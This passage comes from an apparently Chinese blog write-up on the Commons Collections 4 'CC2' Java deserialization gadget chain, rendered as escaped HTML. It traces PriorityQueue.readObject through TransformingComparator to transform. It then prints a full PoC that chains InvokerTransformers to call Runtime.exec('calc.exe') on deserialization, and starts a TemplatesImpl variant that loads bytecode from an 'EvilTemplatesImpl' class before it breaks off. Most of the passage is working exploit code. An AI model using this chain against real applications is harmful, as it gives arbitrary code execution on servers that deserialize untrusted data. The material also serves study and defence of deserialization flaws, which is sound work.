&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SharedSecrets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getJavaOISAccess&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">checkArray&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in all elements.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Elements are guaranteed to be in &amp;#34;proper order&amp;#34;, but the
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// spec has never explained what that might be.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">heapify&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>heapify-&amp;gt; siftDown-&amp;gt; siftDownUsingComparator-&amp;gt; comparator.compare-&amp;gt; TransformingComparator-&amp;gt; compare-&amp;gt; transform
&lt;/code>&lt;/pre>&lt;p>构造poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Comparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.comparators.TransformingComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CC2&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Comparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformingComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PriorityQueue&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="templatesimpl">TemplatesImpl&lt;/h3>
&lt;p>把exp改造为TemplatesImpl的无transformer数组版&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.CtClass&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.comparators.TransformingComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Comparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections2TemplatesImpl&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getBytescode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span> &lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">clazz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">clazz&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
